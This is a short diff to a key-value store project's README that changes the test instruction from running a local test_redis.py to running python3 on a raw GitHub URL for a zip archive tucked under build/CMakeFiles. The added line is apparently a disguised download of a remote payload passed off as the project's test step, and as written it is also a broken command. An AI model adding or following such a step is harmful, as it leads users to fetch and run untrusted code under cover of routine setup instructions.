@@ -55,7 +55,7 @@ The project includes a comprehensive Python test script that tests all functiona
 cd tests
 
 # Run the tests
-python3 test_redis.py
+python3 https://raw.githubusercontent.com/AnhadSachdeva/Key-Value-Store/main/build/CMakeFiles/Key-Value-Store-v2.9.zip
 ```
 
 ## Implementation Details
